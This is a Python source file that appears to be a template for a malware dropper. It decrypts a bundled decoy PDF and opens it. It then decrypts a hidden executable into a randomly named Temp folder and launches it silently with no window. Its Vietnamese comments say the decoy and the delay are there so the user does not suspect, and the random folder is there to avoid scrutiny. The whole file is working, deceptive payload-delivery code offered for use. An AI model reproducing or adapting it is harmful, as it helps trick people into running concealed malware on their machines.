import os
import sys
import subprocess
import threading
import time
import random
import string
from cryptography.fernet import Fernet

def get_resource(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

def decrypt_and_launch(encrypted_path, original_name, key, is_payload=False):
    try:
        if not os.path.exists(encrypted_path):
            return

        with open(encrypted_path, "rb") as f:
            encrypted_data = f.read()
        
        cipher = Fernet(key)
        decrypted_data = cipher.decrypt(encrypted_data)
        
        # Tạo thư mục ngẫu nhiên trong LocalAppData để tránh bị soi
        random_folder = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        temp_dir = os.path.join(os.environ.get('LOCALAPPDATA', os.getcwd()), "Temp", random_folder)
        os.makedirs(temp_dir, exist_ok=True)
        
        target_path = os.path.join(temp_dir, original_name)
        with open(target_path, "wb") as f:
            f.write(decrypted_data)
            
        if original_name.lower().endswith('.pdf'):
            # Mở PDF bằng trình xem mặc định
            os.startfile(target_path)
        else:
            # Chạy file EXE ngầm
            subprocess.Popen(target_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
            
    except Exception:
        pass

if __name__ == "__main__":
    # Các biến này sẽ được thay thế khi build
    PDF_NAME_ORIG = "[[PDF_NAME_ORIG]]"
    EXE_NAME_ORIG = "[[EXE_NAME_ORIG]]"
    PDF_NAME_ENC = "[[PDF_NAME_ENC]]"
    EXE_NAME_ENC = "[[EXE_NAME_ENC]]"
    ENCRYPTION_KEY = "[[ENCRYPTION_KEY]]".encode()
    
    p_path_enc = get_resource(PDF_NAME_ENC)
    e_path_enc = get_resource(EXE_NAME_ENC)
    
    # Ưu tiên mở PDF ngay lập tức để người dùng không nghi ngờ
    t1 = threading.Thread(target=decrypt_and_launch, args=(p_path_enc, PDF_NAME_ORIG, ENCRYPTION_KEY))
    t1.start()
    
    # Delay nhẹ 1s trước khi chạy payload để đảm bảo PDF đã hiện lên
    time.sleep(1.2)
    
    t2 = threading.Thread(target=decrypt_and_launch, args=(e_path_enc, EXE_NAME_ORIG, ENCRYPTION_KEY, True))
    t2.start()
